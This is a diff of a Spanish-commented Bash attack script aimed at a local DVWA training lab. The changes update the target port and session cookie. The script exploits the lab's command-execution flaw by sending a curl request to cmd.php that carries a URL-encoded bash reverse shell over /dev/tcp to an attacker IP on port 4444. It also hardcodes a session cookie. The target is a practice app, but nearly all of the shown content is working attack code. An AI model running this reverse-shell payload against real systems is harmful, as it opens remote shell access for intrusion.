@@ -23,8 +23,8 @@ read -p "> Elige una opción: " config_mode
 
 if [[ "$config_mode" == "1" ]]; then
   # Configuración por defecto para DVWA local
-  URL="http://localhost:8888/vulnerabilities/exec/"
-  COOKIE="PHPSESSID=e50q9934hkqvglfethv9utaeh7; security=low"
+  URL="http://localhost:8080/vulnerabilities/exec/"
+  COOKIE="PHPSESSID=prncnjovnqr61jhn04l32laqp1; security=low"
   ATTACKER_IP="$IP_USER"
   ATTACKER_PORT="4444"
   echo "[+] Usando configuración por defecto:"
@@ -128,7 +128,7 @@ sleep 2
 # ----------------------------
 
 echo "[*] Enviando reverse shell..."
-curl -s "http://localhost:8888/vulnerabilities/exec/cmd.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT%200%3E%261'" > /dev/null
+curl -s "http://localhost:8080/vulnerabilities/exec/cmd.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT%200%3E%261'" > /dev/null
 echo "[✔] Shell enviada."
 
 # ----------------------------
